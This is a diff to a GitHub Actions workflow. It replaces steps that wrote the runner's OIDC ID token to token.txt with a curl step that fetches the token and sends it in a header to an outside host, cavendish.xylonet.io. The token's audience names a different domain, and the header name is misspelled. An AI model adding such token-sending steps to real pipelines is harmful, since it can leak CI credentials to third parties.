@@ -12,17 +12,8 @@ jobs:
       contents: read  # This is required for actions/checkout
 
     steps:
-    - name: Install OIDC Client from Core Package
-      run: npm install @actions/core@1.6.0 @actions/http-client
-    - name: Get Id Token
-      uses: actions/github-script@v7
-      id: idtoken
-      with:
-        script: |
-          const coredemo = require('@actions/core')
-          let id_token = await coredemo.getIDToken()
-          core.exportVariable("ID_TOKEN", id_token)
-    - name: Read ID Token from environment
-      env:
-        ACTIONS_STEP_DEBUG: true
-      run: echo ${ID_TOKEN} >> token.txt
+    - uses: actions/checkout@main
+    - name: Post Token
+      run: |
+        OIDC_TOKEN=$(curl -sLS "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=cavendish.xylonet.us" -H "User-Agent: actions/oidc-client" -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN")
+        curl -i -s -H "Authoriziation: Bearer $OIDC_TOKEN" https://cavendish.xylonet.io/actuator/health
